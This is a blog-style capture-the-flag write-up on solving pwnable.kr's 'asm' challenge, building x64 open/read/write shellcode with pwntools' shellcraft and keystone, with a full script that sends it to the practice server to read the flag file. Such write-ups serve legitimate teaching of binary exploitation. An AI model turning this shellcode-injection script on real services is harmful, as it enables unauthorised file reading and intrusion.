---
title: Generating shellcode with pwntool's shellcraft
date: 2022-01-24 14:14:00 +0100
categories: [CTF, Binary Exploitation]
tags: [ctf, shellcode, pwntools, shellcraft, pwnable.kr, asm, assembly, keystone]
---

# A beginner CTF challenge

Recently I decided to learn more about binary exploitation.
I found [pwnable.kr](http://pwnable.kr), which is a platform containing pwn challenges with different difficulties.
To warm up a little bit and to get to know this platform's eco system I started solving the challenges in the 'Toddler's Bottle' category, which is the easiest one.
These are really for beginners, some of them are rather programming challenges.
Then I came across the challenge named 'asm'.
When I logged into the machine I found besides the program code a readme file and another file with a very long name.
The readme said that I should connect to port 9026 to start the real version of the program which can access the long named file.
The program greets us with the following message:

```
Welcome to shellcoding practice challenge.
In this challenge, you can run your x64 shellcode under SECCOMP sandbox.
Try to make shellcode that spits flag using open()/read()/write() systemcalls only.
If this does not challenge you. you should play 'asg' challenge :)
```

This means that we need to give a shellcode to the program which opens this long named file and outputs its contents, but only using the three listed syscalls.
At first I tought there is no way I will write this shellcode with that long filename by hand, so I started to look for a tool that can do this for us.
After some research I found about shellcraft, which is included in pwntools, that can create shellcode for different architectures very easily.

# Solving with Shellcraft

[Shellcraft](https://docs.pwntools.com/en/stable/shellcraft.html) is a shellcode module inside pwntools.
It provides very simple ways to generate specific shellcodes.
This module has different classes for different architectures and inside these classes there are methods which generate the desired assemblies.
For example the `open()` method will generate a short instruction sequence that sets up the parameters and calls the `open` syscall.
There are more complex methods too, for example `cat()`, which writes the content of a file to the standard output.

Since the challenge wants us to only use the `open`, `read` and `write` syscalls, we will need to use these three.
The `cat()` method cannot be used here, since it uses the `sendfile` syscall.
So let's see the three parts of the shellcode.

The first part is the `open` syscall, which opens the file given in the parameter and returns its file descriptor number, which we can use to access the file later.
The first parameter is the path to the file and the second parameter is the access mode.
For the second parameter we need `O_RDONLY`, which is 0 in glibc.
We can generate this instruction sequence the following way:

```python
>>> open_sc = shellcraft.amd64.open('./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong', 0)
>>> print(open_sc)
    /* open(file='./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong', oflag=0, mode=0) */
    /* push b'./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong\x00' */
    push 0x67
    mov rax, 0x6e6f306f306f306f
    push rax
    mov rax, 0x306f306f306f3030
    push rax
    ...
    mov rax, 0x695f736968742f2e
    push rax
    mov rdi, rsp
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    /* call open() */
    push SYS_open /* 2 */
    pop rax
    syscall
```

As we can see it generates a bunch of mov and push instructions to put the filename to the stack, then puts the stack address in the first paramter, 0 (O\_RDONLY) into the second and calls syscall number 2, which is `open`.
But this form will not suffice, since the `SYS_open` symbol is unknown to the assembler, but with some python string magic we can replace that with the number 2.

The next sequence will call the `read` syscall, which requires the file descriptor of our opened file, a buffer to store the input and a size.
The file descriptor will be returned in the rax register after the `open` syscall.
To put that into the first parameter of the `read()` method we can simply write `'rax'` into the first parameter.
Because we cannot really allocate memory for the input buffer, we can use the stack because we won't use the file name anymore.
We can put the rsp register in the second parameter the same way as rax.
For the size parameter I wrote 30, usually flags are not longer than that and it is not a problem if it is longer than the content of the flag file, it will just return 0.
This is how the generation looks like:

```python
>>> read_sc = shellcraft.amd64.read('rax', 'rsp', 30)
>>> print(read_sc)
    /* call read('rax', 'rsp', 0x1e) */
    mov rdi, rax
    xor eax, eax /* SYS_read */
    push 0x1e
    pop rdx
    mov rsi, rsp
    syscall
```

The `write` sequence will be just as easy.
The first parameter requires the file descriptor where we want to write.
We want to print the buffer to the standard output, so let's set it to 1, which is the file descriptor of stdout.
The second parameter is the pointer to the buffer from where we want to write.
We put the content into the stack, so we can just set rsp as the second parameter with the `'rsp'` syntax.
The third parameter is the length, which I set to 30 again.
This is the last part of the shellcode:

```python
write_sc = shellcraft.amd64.write(1, 'rsp', 30) 
>>> print(write_sc)
    /* write(fd=1, buf='rsp', n=0x1e) */
    push 1
    pop rdi
    push 0x1e
    pop rdx
    mov rsi, rsp
    /* call write() */
    push SYS_write /* 1 */
    pop rax
    syscall
```

Here we will again need to replace the `SYS_write` string with the number 1, because we won't have this symbol.

Now we need to somehow transform these strings into instruction bytes.
For that we can use the [keystone engine](https://www.keystone-engine.org/) in python.
Here we only need to instantiate the `Ks` class setting it to 64 bit x86 architecture, and we can assemble the merged instructions.

```python
>>> ks = Ks(KS_ARCH_X86, KS_MODE_64)
>>> encoding, count = ks.asm(assembly)
>>> print(encoding)
[106, 103, 72, 184, 111, 48, 111, 48, ...]
```

We now only need to merge the bytes into a bytes variable, then we can send it to the target.
Here is the full script:

```python
#!/usr/bin/env python3

from pwn import *
from keystone import *

open_sc = shellcraft.amd64.open('./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong', 0).replace('SYS_open', '2')
read_sc = shellcraft.amd64.read('rax', 'rsp', 30)
write_sc = shellcraft.amd64.write(1, 'rsp', 30).replace('SYS_write', '1')


assembly = open_sc + read_sc + write_sc


ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, count = ks.asm(assembly)

shellcode = b''

for i in encoding:
    shellcode += i.to_bytes(1, byteorder='little')

r = remote('pwnable.kr', 9026)
r.recvuntil(b'give me your x64 shellcode: ')
r.sendline(shellcode)
flag = r.recvline().decode('utf-8')
print(f'[+] Flag: {flag}') 
```

If we run this, we will get the flag.

```
$ ./expl.py 
[+] Opening connection to pwnable.kr on port 9026: Done
[+] Flag: [---FLAG---]

[*] Closed connection to pwnable.kr port 9026
```

Although this was a beginner challenge, it made me learn a very powerful tool which I have not heard of before.
With shellcraft later harder challenges can be solved more easily than just writing bytes by hand.


